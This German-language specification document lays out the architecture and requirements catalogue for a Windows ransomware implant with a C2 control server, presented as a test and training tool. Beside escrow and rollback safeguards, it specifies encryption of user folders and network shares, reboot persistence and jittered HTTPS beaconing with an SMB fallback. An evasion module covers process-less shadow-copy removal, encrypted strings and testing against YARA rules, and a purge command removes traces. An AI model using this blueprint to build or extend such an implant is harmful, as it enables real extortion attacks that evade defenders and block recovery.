# Ransomware · 13 · Pflichtenheft Teil 1 – Architektur und Anforderungen

# Ransomware – Band 13: Pflichtenheft Teil 1 – Architektur und Anforderungskatalog

Stand August 2026. Eigenes Test- und Schulungsimplantat mit Steuerungsapp. Anforderungen mit IDs, Priorität, Quellenbezug (andere Bänder) und Abnahmekriterium. Freie Entwürfe sind als solche gekennzeichnet.

## 1. Geltungsbereich

**Ziel:** Ein Windows-Implantat (Encoder), das kontrolliert verschlüsselt, entschlüsselt und sperren kann, plus eine Steuerungsapp, die mehrere Hosts remote steuert, Key-Escrow betreibt und jeden Schritt auditierbar macht.

**Ausdrücklich kein Ziel:**
- Kein Virenscanner-Ersatz und kein Feldtest gegen echte Bedrohungsgruppen.
- Kein „möglichst schnell fertig“ — das Gerät darf auf Testdaten laufen, aber nicht auf Produktivdaten, bevor das Abnahmekriterium aus Band 12 §8 erfüllt ist.
- Kein Lösegeld-Geschäftsprozess, keine Payment-Integration.

**Warum diese Grenzen** (freie Einordnung): Der häufige Projektfehler bei solchen Nachbauten ist, dass die Verschlüsselung als Hauptarbeit unterschätzt und die Steuerstrecke überschätzt wird. Der Encoder hat eine Fehlerklasse, die kein normaler Agent hat — sein Erfolg ist ein Schaden (Band 12 §1).

## 2. Bausteine

```
┌──────────────────────────────────────────────────────────┐
│ app-ui        Operator-Oberfläche (Scopes, Runs, Audit)  │
├──────────────────────────────────────────────────────────┤
│ app-server    REST/gRPC + Beacon-Endpunkte, Task-Queue,  │
│               Rollen, Audit-Log, Run-Aggregation         │
├──────────────────────────────────────────────────────────┤
│ key-escrow    Key-Store, Wrap/Unwrap, Vier-Augen-Export  │
├──────────────────────────────────────────────────────────┤
│ agent.exe     Beacon-Loop + Task-Ausführung + Encoder    │
├──────────────────────────────────────────────────────────┤
│ harness       Korpus, Roundtrip, Crash-Injektion, Messung│
└──────────────────────────────────────────────────────────┘
```

Vier deploybare Einheiten plus Harness. Die Teilung von `app-server` und `key-escrow` ist Absicht: Der Schlüsselbestand soll separat abgesichert, separat protokolliert und ohne App-Neustart sperrend abschaltbar sein (freie Einordnung).

## 3. Abläufe

**Dry-Run (Pflicht vor jeder Mutation):**

```
Operator: scope anlegen → dry-run starten
agent:    enumerate → Dateimenge + Volumen + Freigaben + VSS-Status melden
server:   Report speichern, Schätzwert anzeigen
agent:    Hashes unverändert, keine Writes          ← Abbruchbedingung
```

**Scharf schalten:**

```
Task encrypt(scope, rate, mode)
agent: Per-Host-Key generieren → KEM-versiegeln → ESCROW CONFIRMED (server-ACK)
agent: Manifest + Journal anlegen
agent: enumerate → queue → workerpool → chunkweise verschlüsseln
agent: Fortschritt + Fehlerklassen melden
server: Run-Aggregation, Event-Log
```

**Rollback:**

```
Task decrypt(key_import | escrow_ref)
agent: Manifest laden → Range-Liste anwenden → Tag je Chunk prüfen
agent: Restore, Verifikation gegen Manifest-Hash
```

**Lock-Only-Modus** (dritter Modus, ohne Datenzerstörung): Nur exklusive Handles mit Sharing-Mode 0, kein einziger Write — demonstriert die blinde Stelle der klassischen Detektion (Band 08 §10, Band 12 §6).

## 4. Modus-Matrix

| Modus | schreibt Daten | braucht Key-Escrow | Zweck |
|---|---|---|---|
| `enumerate` | nein | nein | Inventur, Scope-Planung |
| `dry-run` | nein | nein | Schätzung, Freigabe-Grundlage |
| `lock-only` | **nein** | nein | Schulungsdemo, Detektionslücke zeigen |
| `encrypt` | ja | **ja, zwingend vor erstem Write** | eigentlicher Lauf |
| `decrypt` | ja | Schlüsselimport nötig | Rücknahme |
| `selfdestruct` | Journal/Binary weg | muss bestätigt sein | Aufräumen nach Übung |

## 5. Anforderungskatalog

Priorität: **MUSS** (ohne das kein Betrieb) · **SOLL** (gehört in v1) · **KANN** (Ausbau). Quellenbezug = Band dieser Sammlung.

### Modul A – Encoder-Core

| ID | Anforderung | Pfl. | Quelle | Abnahmekriterium |
|---|---|---|---|---|
| A001 | Vollständiger Roundtrip encrypt → decrypt ohne Datenverlust über den gesamten goldenen Korpus | MUSS | B09, B12 §4 | 100 % Hashübereinstimmung gegen Ausgangsmanifest |
| A002 | Idempotenz: Mehrfaches Starten verändert nichts am Ergebnis | MUSS | B11 §3 | Zweiter Lauf ist No-Op, nachweisbar per Hashvergleich |
| A003 | Crash-Sicherheit: Kill mitten im Chunk, danach Resume ohne Verlust | MUSS | B12 §4 Schritt 7 | Roundtrip nach Kill weiterhin 100 % |
| A004 | Abbruch per Task binnen **einem** Beacon-Zyklus wirksam | MUSS | B11 §2 | Manifest danach konsistent, Decryptor lauffähig |
| A005 | Pause/Resume greift mitten im Chunk, nicht nur zwischen Dateien | SOLL | B11 §3 | Rate 0 → Schreibrate 0 innerhalb eines Zyklus |
| A006 | Alle Modi gemäß Modus-Matrix, eine einzige Codebasis für alle | MUSS | B08 §10 | kein Modus als separates Binary |
| A007 | Neustart des Hosts mitten im Lauf → Persistenz nimmt wieder auf, erkennt bereits verschlüsselte Dateien | MUSS | B04, B12 §7 | kein Doppel-Encoding nach Reboot |

### Modul B – Krypto und Dateiformat

| ID | Anforderung | Pfl. | Quelle | Abnahmekriterium |
|---|---|---|---|---|
| B001 | Per-File-DEK (256 Bit), Key-Wrapping auf Per-Host-Key, kein Plaintext-Key auf Disk | MUSS | B03 §2, B09 §4 | Rohsuche auf dem Datenträger liefert kein Key-Muster |
| B002 | Hybrid-KEM X25519 + ML-KEM-768, Shared Secret über HKDF-SHA-256 mit Kontext-Bindung | SOLL | B09 §4 | Vektor-Test gegen Referenzimplementierung |
| B003 | AEAD in Chunks (Default 1 MB), Chunk-Index im AAD, Final-Tag gegen Trunkierung | MUSS | B09 §3 | Umsortieren/Duplizieren/Abschneiden von Chunks wird erkannt |
| B004 | Nonce pro Chunk deterministisch aus Per-File-Nonce + Zähler; keine Wiederverwendung über Prozessgrenzen | MUSS | B09 §3, §6 | Resume-Test: Nonce-Basis aus Manifest, nicht aus Uhr/Zähler im RAM |
| B005 | Format-Version + Kennung im Header, migrationsfähig | MUSS | B09 §5 | Reader akzeptiert Format n und n-1 |
| B006 | Explizite Range-Liste für Teilverschlüsselung im Manifest **und** im Footer | MUSS | B08 §7, B09 §5 | Restore ohne Manifest allein aus Footer möglich |
| B007 | AES-GCM Key-Wechsel-Kriterium dokumentiert (~350 GB pro Key laut libsodium) | KANN | B09 §3 | Kennzahl im Run-Report |
| B008 | AES-GCM mit `BCRYPT_BLOCK_PADDING`-Flag verboten; pro Chunk neue Auth-Info | MUSS | B09 §2 | statischer Check/Unit-Test |

### Modul C – Scope und Enumeration

| ID | Anforderung | Pfl. | Quelle | Abnahmekriterium |
|---|---|---|---|---|
| C001 | Includes/Excludes per Glob, pro Host und pro Scope versioniert | MUSS | B11 §5 | Rollback auf vorherige Scope-Version möglich |
| C002 | Reparse Points/Junctions erkennbar und überspringbar, optional folgen | MUSS | B08 §5 | Junction-Schleife terminiert im Test |
| C003 | Long-Path-Support mit `\\?\`-Präfix, abschaltbar für Regressionstest | MUSS | B08 §4, B12 §2 | Pfad > 300 Zeichen wird verarbeitet |
| C004 | Laufwerkstypen festlegen (`FIXED`, `REMOVABLE`, `REMOTE`), CD-ROM- und Netzwerksonderfälle definiert | SOLL | B08 §4 | Matrixtest je Typ |
| C005 | Netzwerkfreigaben separat enumerierbar, mit eigenem Rate-Deckel | SOLL | B08 §4, B11 §6 | SMB-Lauf wird nicht ohne Deckel verschlüsselt |
| C006 | Extension-Blacklist, Ausschluss der eigenen Binary, der eigenen Hinweisdateien, sowie von Manifest- und Journal-Verzeichnis | MUSS | B03 §3, B08 §5 | keine Selbsterschlüsselung im Test |
| C007 | Enumeration liefert Dateimenge und Gesamtvolumen **vor** der ersten Mutation | MUSS | B11 §6 | Dry-Run-Zahl weicht < 2 % vom späteren Lauf ab |
| C008 | Enumeration getrennt von Verschlüsselung (Queue, ein Producer, N Worker) | SOLL | B08 §5, §6 | kein rekursiver Direkt-Encode |

### Modul D – I/O und Leistung

| ID | Anforderung | Pfl. | Quelle | Abnahmekriterium |
|---|---|---|---|---|
| D001 | `FILE_FLAG_SEQUENTIAL_SCAN` bei sequentiellem Lesen großer Dateien | MUSS | B08 §6 | Messprotokoll mit/ohne Flag |
| D002 | Threadpool konfigurierbar; Standard: Anzahl Kerne, nicht 4×Kerne | SOLL | B08 §6, B12 §5 | Messung über 4, 8, N Kerne, kein Durchsatzrückgang |
| D003 | Asynchrones I/O (IOCP) optional, erst in einer späteren Phase, synchroner Pfad bleibt Referenz | KANN | B08 §6 | beide Pfade bestehen die Roundtrips |
| D004 | Overhead pro kleiner Datei < 1 ms als Zielwert | SOLL | B12 §5 | Benchmark mit 2 Mio. Kleinstdateien |
| D005 | Rate-Limiting pro Host und pro Scope, zur Laufzeit änderbar | MUSS | B11 §6 | gemessene Schreibrate hält Deckel ein |
| D006 | Handle-Leak-Freiheit über 100.000 Dateien | MUSS | B12 §5 | Handlezahl konstant |
| D007 | Schreibvorgang mit Commit-Flag + `FlushFileBuffers` vor Statuswechsel | MUSS | B09 §6 | Crash-Test besteht erneut |

### Modul E – Fehlerbehandlung und Journaling

| ID | Anforderung | Pfl. | Quelle | Abnahmekriterium |
|---|---|---|---|---|
| E001 | Fehlerklassen gemäß Matrix: Access (5), Sharing (32), User-Mapped (1224), Disk-Full (112), Not-Found (2/3), Network (53/64) | MUSS | B08 §8 | Je Klasse ein Testfall |
| E002 | Begrenzte Wiederholungen mit Backoff, **kein** Endlosloop an einer Datei | MUSS | B08 §8 | blockierte Datei nach N Versuchen in Fehlerliste |
| E003 | Disk-Full: globaler Abbruch, Journal vollständig, Rest als unverschlüsselt markiert | MUSS | B08 §8 | Restore aus Journal vollständig |
| E004 | Schreibtest ohne Bytes zu schreiben (nur `CreateFileW` mit `GENERIC_WRITE`) | SOLL | B08 §3 | Hash der Datei bleibt beim Test unverändert |
| E005 | Privilegpfad wählbar: ACL-Umschreiben **oder** `SeBackup`/`SeRestore` ohne ACL-Restspuren | SOLL | B08 §3 | Forensikvergleich beider Modi dokumentiert |
| E006 | Blockierte Dateien über Restart Manager lösen, `RmCritical`/Explorer schonen | SOLL | B08 §2 | Datei mit offenem Handle wird im Test erfasst |
| E007 | Journal im JSONL-Format, append-only, Replay-fähig | MUSS | B09 §5, B12 §4 | Replay rekonstruiert den Zustand vor Crash |

### Modul F – Beacon und Steuerstrecke

| ID | Anforderung | Pfl. | Quelle | Abnahmekriterium |
|---|---|---|---|---|
| F001 | HTTPS-Polling mit Jitter; Basis und Jitterband konfigurierbar | MUSS | B11 §1, §2 | Zeitreihenanalyse zeigt keine Äquidistanz |
| F002 | Task-Erkennung über feste Task-ID, Deduplizierung im Implantat-Journal | MUSS | B11 §3 | Doppelzustellung führt zu keiner Zweitwirkung |
| F003 | Task-Queue serverseitig voraus planbar und abbrechbar | SOLL | B11 §3 | Cancel vor Check-in wirkt |
| F004 | Key-Escrow-ACK **vor** erstem Datenwrite, sonst kein Start | MUSS | B11 §3 | Serverausfall verhindert Encoderstart messbar |
| F005 | Transport HTTPs primär, Named Pipe/SMB als Sekundärstrecke für hosts ohne Egress | KANN | B11 §1 | ein Host verschlüsselt ohne eigenen Internetzugang |
| F006 | mTLS mit Client-Zertifikat, Pinning, Rolle aus Zertifikat abgeleitet | SOLL | B11 §1, §4 | fremdes Zertifikat wird abgewiesen |
| F007 | Schlafphase in Stücken, exponentielles Backoff bei unerreichbarem Server, harte Obergrenze für die Gesamtlaufzeit | MUSS | B11 §2 | Netzausfall 1 h → kein vergessener Lauf |
| F008 | Ergebnisberichte verschlüsselt, Batch-fähig, mit Run-ID | SOLL | B11 §2 | Report auch bei 40 Hosts ohne Lawine |

### Modul G – Server, Datenmodell, Rollen

| ID | Anforderung | Pfl. | Quelle | Abnahmekriterium |
|---|---|---|---|---|
| G001 | Schema gemäß B11 §5 (hosts, keys, tasks, events, scopes, runs) | MUSS | B11 §5 | Migration testbar, Version im Schema |
| G002 | `events` append-only und getrennt vom Zustand | MUSS | B11 §5 | Verlauf „wer setzte wann welchen Scope" auswertbar |
| G003 | Drei Rollen: Operator, Analyst, Key-Holder; Key-Export nur mit Zweitperson | MUSS | B11 §5, §6 | Einzel-Export technisch unmöglich |
| G004 | Run-Aggregation: Fortschritt, Fehlerklassen, Dateimenge, Volumen | MUSS | B12 §5 | Report nach Lauf vollständig |
| G005 | Rate-Deckel pro Scope erzwingen, serverseitig prüfen | SOLL | B11 §6 | gemeldete Rate wird begrenzt |
| G006 | Dry-Run als privilegierter Modus, Report archivpflichtig | MUSS | B11 §6 | kein scharfer Start ohne dokumentierten Dry-Run |

### Modul H – Evasion (nachrangig, aber definiert)

| ID | Anforderung | Pfl. | Quelle | Abnahmekriterium |
|---|---|---|---|---|
| H001 | Prozesslose VSS-Behandlung über `DeviceIoControl`, kein `vssadmin` | SOLL | B08, B10 §4 | Sysmon zeigt Ioctl statt Prozessstart |
| H002 | Strings verschlüsselt, per-Build-Schlüssel, nach Gebrauch genullt | SOLL | B10 §3.1 | Strings-Scan liefert keine Klartextanker |
| H003 | keine Child-Prozesse im Encoderpfad | SOLL | B10 §3.5 | Prozessbaum im Test unverändert |
| H004 | Kein ETW/AMSI-Patch in v1, erst nach Messung erwägen | KANN | B10 §3.3 | Entscheidung dokumentiert |
| H005 | YARA-Matrix gegen öffentliche Regelsätze | SOLL | B10 §3.6 | Regellauf als Build-Artefakt |

### Modul K – Observability und Testharness

| ID | Anforderung | Pfl. | Quelle | Abnahmekriterium |
|---|---|---|---|---|
| K001 | Goldener Korpus als versionierter Datensatz, jede Regression bekommt eine Datei | MUSS | B12 §2 | Korpus wächst mit jedem gefundenen Fehler |
| K002 | CI-Lauf: Roundtrip, Crash-Injektion, Idempotenz, Korpus >= 10.000 Dateien | MUSS | B12 §4 | Build fehlerhaft bei Abweichung |
| K003 | Detektionsgegenprobe: Canary-Treffer, VSS-Sichtbarkeit, Entropie-Rate, Rename-Burst, Lock-only | SOLL | B12 §6 | Tabelle im Report, Lock-only bleibt stumm |
| K004 | Messprofile: Durchsatz pro Kern, Overhead pro Kleinstdatei, Handlezahl, RAM | MUSS | B12 §5 | Zahlen im Release-Protokoll |

## 6. Beacon-API im Entwurf

```
POST /v1/hello        {host_id, hostname, os, arch, agent_ver, kem_pub, capabilities}
                      → 201 {session_id, policy_ver, next_checkin_ms}
POST /v1/beacon       {session_id, seq, state_digest, journal_tail_id}
                      → 200 {tasks:[{id, type, payload, deadline_ms}], policy_ver}
POST /v1/result       {session_id, task_id, seq, progress, counters, errors[], log_ref}
                      → 204
POST /v1/escrow       {session_id, host_key_wrap, kem_ciphertext, nonce_basis,
                       format_ver, run_id}
                      → 200 {escrow_ref, confirmed: true}      ← ohne diesen ACK kein Start
POST /v1/events       {session_id, events:[{at, type, payload}]}
                      → 204
GET  /v1/policy?ver=N → 200 {scope, limits, mode} | 304
```

Drei Regeln dazu, die in keinem Protokoll fehlen dürfen (freie Einordnung):
1. **`seq` plus `journal_tail_id`** erlauben dem Server zu erkennen, ob Berichte fehlen — und dem Agenten, verlorene Antworten zu wiederholen, ohne Tasks doppelt auszuführen.
2. **`deadline_ms` am Task** verhindert, dass ein überfälliger Task nach dreistündiger Netzpause blind ausgeführt wird.
3. **`/v1/escrow` ist der einzige Endpunkt, der einen Zustand irreversibel macht.** Er gehört separat abgesichert, separat protokolliert und separat monitorgeprüft.

## 7. Konfigurationsdatei (Entwurf)

```
[agent]
session_id      = 66a204aee7861ae72f21b4e0
beacon_base     = 45000
jitter_pct      = 25
max_run_minutes = 240
mode_default    = dry_run

[scope]
includes        = C:\Users\*, D:\Projekte\**
excludes        = *.exe, *.dll, *.msi, *.lynx, README-*.txt
follow_junctions = false
encrypt_network  = true

[engine]
threads          = 8
chunk_bytes      = 1048576
head_bytes       = 1048576
stride_bytes     = 5242880
rate_kbps        = 20000
use_se_backup    = true
io_backend       = sync          ; sync | iocp

[escrow]
url              = https://c2.internal/v1/escrow
require_ack      = true
```

Die Parameter `head_bytes`/`stride_bytes`/`chunk_bytes` sind bewusst frei sichtbar, nicht einkompiliert: nur so lassen sich die Teilverschlüsselungs-Randfälle aus Band 08 §7 gezielt durchtesten (freie Einordnung).

## 8. CLI-Matrix

| Aufruf | Wirkung | Netz nötig |
|---|---|---|
| `agent --selftest` | Korpus auf dem lokalen Rechner, Roundtrip gegen Tempkopie | nein |
| `agent --enumerate --scope s1` | Inventur + Report | nein |
| `agent --dry-run --scope s1` | Schätzung, keine Mutation | nein |
| `agent --encrypt --scope s1 [--key-out file]` | scharf, ohne App im Standalone-Modus | nur bei Escrow-Pflicht |
| `agent --lock-only --scope s1 [--hold 120s]` | exklusive Handles, keine Writes | nein |
| `agent --decrypt --manifest m.jsonl [--key file]` | Rücknahme | nein |
| `agent --beacon` | Dauerbetrieb als Agent | ja |
| `agent --journal-replay m.jsonl` | Zustand rekonstruieren | nein |
| `agent --purge` | Binary + Journal + Manifeste, nach Escrow-Bestätigung | ja |

**Regel:** Jeder Modus muss **offline allein** lauffähig sein, auch `decrypt`. Hängt die Recovery an der Erreichbarkeit des Servers, ist die App ein Single Point of Failure im eigenen Selbsttest (Band 09 §7).

## Quellen

- Diese Notiz ist ein Entwurf (freie Einordnung) mit Verankerung in: Band 03 (Krypto-Architektur), Band 04 (Detektion/Persistence), Band 08 (Windows-API, Fehlermatrix, Lock-only), Band 09 (Krypto-Implementierung, Formate), Band 10 (Evasion, Build), Band 11 (C2, Task-Invarianten, Schema), Band 12 (Testharness, Abnahmekriterien)
- Fortsetzung in Band 14: Abhängigkeitsgraph, Meilensteine, Aufwand, Risiken, offene Entscheidungen
